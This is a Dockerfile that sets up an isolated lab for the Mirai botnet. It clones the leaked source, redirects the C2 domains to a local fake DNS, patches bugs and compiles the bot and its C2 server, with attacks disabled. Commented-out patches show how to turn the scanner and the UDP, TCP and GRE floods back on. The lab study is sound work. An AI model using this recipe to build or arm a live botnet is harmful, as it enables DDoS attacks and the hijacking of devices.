# Development.
#    - Mirai bot
#    - Mirai cnc server
#    - Fake dns server to locally resolve default cnc domain name
#    - Attacks disabled

FROM ubuntu:focal AS builder

RUN apt update && DEBIAN_FRONTEND=noninteractive apt install -y \
    git \
    build-essential \
    golang \
    python3 \
    electric-fence \
    mysql-server \
    mysql-client \
    iproute2 \
    iputils-ping \
    telnet \
    dnsutils \
    net-tools \
    tcpdump \
    emacs-nox \
    gdb \
    strace \
    && rm -rf /var/lib/apt/lists/*

RUN mkdir -p /var/run/mysqld &&\
    chown mysql:mysql /var/run/mysqld

WORKDIR /opt
ENV GOPATH /opt/go

RUN git clone https://github.com/Crypt0s/FakeDns &&\
    git clone https://github.com/jgamblin/Mirai-Source-Code.git

# '/opt/FakeDns/mirai.conf' solve the domain name to the IP address of the cnc server
# (run another container and execute cnc)
RUN echo "A cnc.changeme.com 172.17.0.3" > FakeDns/mirai.conf &&\
    echo "A report.changeme.com 172.17.0.3" >> FakeDns/mirai.conf

RUN mkdir go &&\
    go get github.com/go-sql-driver/mysql &&\
    go get github.com/mattn/go-shellwords

# patches
## build
### ignore other architectures
RUN awk 'NR>=52&&NR<=55{$0="#"$0} {print $0}' Mirai-Source-Code/mirai/build.sh > build.sh.tmp && mv build.sh.tmp Mirai-Source-Code/mirai/build.sh
## cnc
### fix sql error
RUN sed --in-place '2c use mirai;' Mirai-Source-Code/scripts/db.sql
### open database using unix sockets instead of tcp
### replace this: db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))
###         with: db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@unix(/var/run/mysqld/mysqld.sock)/%s", dbUser, dbPassword, dbName))
RUN sed --in-place 's|"%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName|"%s:%s@unix(/var/run/mysqld/mysqld.sock)/%s", dbUser, dbPassword, dbName|' Mirai-Source-Code/mirai/cnc/database.go
### include database error checks
RUN sed --in-place '/Mysql DB opened/i if err := db.Ping(); err != nil {fmt.Println("ERROR [from patches in Dockerfile]: database Ping() failed, check connection method. Is mysql using tcp or unix sockets?")}' Mirai-Source-Code/mirai/cnc/database.go
## bot
### replace the hardcoded dns server (8.8.8.8) with the FakeDNS running in localhost.
RUN sed --in-place 's/8,8,8,8/127,0,0,1/g' Mirai-Source-Code/mirai/bot/resolv.c
RUN sed --in-place 's/8,8,8,8/127,0,0,1/g' Mirai-Source-Code/mirai/bot/attack_udp.c
RUN sed --in-place 's/8,8,8,8/127,0,0,1/g' Mirai-Source-Code/mirai/bot/util.c
### fix bug: unlock the table TABLE_KILLER_STATUS before retreiving values from it (in killer.c)
RUN sed --in-place '/table_retrieve_val(TABLE_KILLER_STATUS, NULL)/i table_unlock_val(TABLE_KILLER_STATUS);' Mirai-Source-Code/mirai/bot/killer.c
### fix bug: and lock it again (in killer.c)
RUN sed --in-place '/table_retrieve_val(TABLE_KILLER_STATUS, NULL)/a table_lock_val(TABLE_KILLER_STATUS);' Mirai-Source-Code/mirai/bot/killer.c
# ### remove directives to enable port scanning in debug mode (in main.c)
# ### 158 #ifndef DEBUG
# ### 159 #ifdef MIRAI_TELNET
# ### 160     scanner_init();
# ### 161 #endif
# ### 162 #endif
# RUN linenum=$(sed -n '/scanner_init/=' Mirai-Source-Code/mirai/bot/main.c) &&\
#     sed --in-place "$((linenum - 2)) s/^/\/\//; $((linenum +2)) s/^/\/\//" Mirai-Source-Code/mirai/bot/main.c &&\
#     sed --in-place '/scanner_init/i printf("[from patches in Dockerfile] calling scanner_init()");' Mirai-Source-Code/mirai/bot/main.c
# ### enable attacks in debug mode in attack_udp.c
# RUN awk 'BEGIN{directive=0} /^#ifdef DEBUG/{directive+=1} /^#endif/{directive-=1} \
# /break;/&&directive {$0="//"$0} \
# /if \(errno != 0\)/&&directive {$0="//"$0} \
# /printf\("errno = %d\\n", errno\);/&&directive {$0="//"$0} \
# {print $0}' Mirai-Source-Code/mirai/bot/attack_udp.c > attack_udp.c.tmp && mv attack_udp.c.tmp Mirai-Source-Code/mirai/bot/attack_udp.c

# ### enable attacks in debug mode in attack_tcp.c
# RUN awk 'BEGIN{directive=0} /^#ifdef DEBUG/{directive+=1} /^#endif/{directive-=1} \
# /break;/&&directive {$0="//"$0} \
# /if \(errno != 0\)/&&directive {$0="//"$0} \
# /printf\("errno = %d\\n", errno\);/&&directive {$0="//"$0} \
# {print $0}' Mirai-Source-Code/mirai/bot/attack_tcp.c > attack_tcp.c.tmp && mv attack_tcp.c.tmp Mirai-Source-Code/mirai/bot/attack_tcp.c

# ### enable attacks in debug mode in attack_gre.c
# RUN awk 'BEGIN{directive=0} /^#ifdef DEBUG/{directive+=1} /^#endif/{directive-=1} \
# /break;/&&directive {$0="//"$0} \
# /if \(errno != 0\)/&&directive {$0="//"$0} \
# /printf\("errno = %d\\n", errno\);/&&directive {$0="//"$0} \
# {print $0}' Mirai-Source-Code/mirai/bot/attack_gre.c > attack_gre.c.tmp && mv attack_gre.c.tmp Mirai-Source-Code/mirai/bot/attack_gre.c


# compile
RUN cd Mirai-Source-Code/mirai &&\
    rm -rf debug &&\
    mkdir debug &&\
    chmod +x build.sh &&\
    ./build.sh debug telnet &&\
    # 'prompt.txt' file must be in the same directory as the compiled cnc binary (if not, the cnc will not accept telnet connections)
    cp prompt.txt debug/prompt.txt


RUN echo "#!/bin/bash" > /init_cmd.sh &&\
    echo "set -e" >> /init_cmd.sh &&\
    echo "service mysql start" >> /init_cmd.sh &&\
    echo "python3 /opt/FakeDns/fakedns.py -c /opt/FakeDns/mirai.conf &" >> /init_cmd.sh &&\
    echo "sleep 2" >> /init_cmd.sh &&\
    echo "mysql < /opt/Mirai-Source-Code/scripts/db.sql" >> /init_cmd.sh &&\
    echo "mysql -e 'use mirai; INSERT INTO users VALUES (NULL, \"muser\", \"mpass\", 0, 0, 0, 0, -1, 1, 30, \"\");'" >> /init_cmd.sh &&\
    echo "ss -natp" >> /init_cmd.sh &&\
    echo "mysql -e 'use mirai; select * from users;'" >> /init_cmd.sh &&\
    echo "/bin/bash" >> /init_cmd.sh &&\
    chmod +x /init_cmd.sh

CMD ["/init_cmd.sh"]
